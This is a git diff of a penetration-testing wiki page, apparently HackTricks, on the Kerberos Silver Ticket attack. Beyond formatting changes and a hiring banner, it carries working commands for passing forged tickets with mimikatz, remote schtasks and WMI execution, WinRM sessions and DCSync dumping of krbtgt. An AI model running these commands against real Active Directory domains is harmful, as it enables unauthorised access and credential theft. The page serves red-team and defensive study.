@@ -1,4 +1,4 @@
-
+# Silver Ticket
 
 <details>
 
@@ -16,14 +16,21 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="original">
 
-# Silver ticket
+If you are interested in **hacking carer** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
 
-The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** \(like the **PC account hash**\). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.
+{% embed url="https://www.stmcyber.com/careers" %}
+{% endhint %}
 
-In this case, the NTLM hash of a computer account \(which is kind of a user account in AD\) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.
+## Silver ticket
 
-It also must be taken into account that it is possible to forge tickets using the AES Kerberos keys \(AES128 and AES256\). To know how to generate an AES key read: [section 4.4 of MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) or the [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).
+The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** (like the **PC account hash**). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.
+
+In this case, the NTLM hash of a computer account (which is kind of a user account in AD) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.
+
+It also must be taken into account that it is possible to forge tickets using the AES Kerberos keys (AES128 and AES256). To know how to generate an AES key read: [section 4.4 of MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) or the [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).
 
 {% code title="Linux" %}
 ```bash
@@ -47,11 +54,11 @@ mimikatz.exe "kerberos::ptt ticket.kirbi"
 ```
 {% endcode %}
 
-The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>` or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
+The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>` or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
 
-## Mitigation
+### Mitigation
 
-Silver ticket events ID \(more stealth than golden ticket\):
+Silver ticket events ID (more stealth than golden ticket):
 
 * 4624: Account Logon
 * 4634: Account Logoff
@@ -59,79 +66,30 @@ Silver ticket events ID \(more stealth than golden ticket\):
 
 [**More information about Silver Tickets in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 
-# Available Services
+## Available Services
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align:left">Service Type</th>
-      <th style="text-align:left">Service Silver Tickets</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align:left">WMI</td>
-      <td style="text-align:left">
-        <p>HOST</p>
-        <p>RPCSS</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">PowerShell Remoting</td>
-      <td style="text-align:left">
-        <p>HOST</p>
-        <p>HTTP</p>
-        <p>Depending on OS also:</p>
-        <p>WSMAN</p>
-        <p>RPCSS</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">WinRM</td>
-      <td style="text-align:left">
-        <p>HOST</p>
-        <p>HTTP</p>
-        <p>In some occasions you can just ask for: WINRM</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">Scheduled Tasks</td>
-      <td style="text-align:left">HOST</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">Windows File Share, also psexec</td>
-      <td style="text-align:left">CIFS</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">LDAP operations, included DCSync</td>
-      <td style="text-align:left">LDAP</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">Windows Remote Server Administration Tools</td>
-      <td style="text-align:left">
-        <p>RPCSS</p>
-        <p>LDAP</p>
-        <p>CIFS</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">Golden Tickets</td>
-      <td style="text-align:left">krbtgt</td>
-    </tr>
-  </tbody>
-</table>
+| Service Type                               | Service Silver Tickets                                                     |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
+| Scheduled Tasks                            | HOST                                                                       |
+| Windows File Share, also psexec            | CIFS                                                                       |
+| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
 Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-# Abusing Service tickets
+## Abusing Service tickets
 
 In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
 
-## CIFS
+### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** \(if they are exposed\) and copy files to a part of the remote filesystem just doing something like:
+With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
 
 ```bash
 dir \\vulnerable.computer\C$
@@ -141,9 +99,11 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
 
-{% page-ref page="../ntlm/psexec-and-winexec.md" %}
+{% content-ref url="../ntlm/psexec-and-winexec.md" %}
+[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
+{% endcontent-ref %}
 
-## HOST
+### HOST
 
 With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
 
@@ -159,7 +119,7 @@ schtasks /query /S some.vuln.pc
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 
-## HOST + RPCSS
+### HOST + RPCSS
 
 With these tickets you can **execute WMI in the victim system**:
 
@@ -175,9 +135,11 @@ wmic remote.computer.local list full /format:list
 
 Find **more information about wmiexec** in the following page:
 
-{% page-ref page="../ntlm/wmicexec.md" %}
+{% content-ref url="../ntlm/wmicexec.md" %}
+[wmicexec.md](../ntlm/wmicexec.md)
+{% endcontent-ref %}
 
-## HOST + WSMAN \(WINRM\)
+### HOST + WSMAN (WINRM)
 
 With winrm access over a computer you can **access it** and even get a PowerShell:
 
@@ -187,25 +149,35 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 
 Check the following page to learn **more ways to connect with a remote host using winrm**:
 
-{% page-ref page="../ntlm/winrm.md" %}
+{% content-ref url="../ntlm/winrm.md" %}
+[winrm.md](../ntlm/winrm.md)
+{% endcontent-ref %}
 
 {% hint style="warning" %}
 Note that **winrm must be active and listening** on the remote computer to access it.
 {% endhint %}
 
-## LDAP
+### LDAP
 
 With this privilege you can dump the DC database using **DCSync**:
 
-```text
+```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
 
 **Learn more about DCSync** in the following page:
 
-{% page-ref page="dcsync.md" %}
+{% content-ref url="dcsync.md" %}
+[dcsync.md](dcsync.md)
+{% endcontent-ref %}
 
+{% hint style="danger" %}
+<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="original">
 
+If you are interested in **hacking carer** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+
+{% embed url="https://www.stmcyber.com/careers" %}
+{% endhint %}
 
 <details>
 
@@ -222,5 +194,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
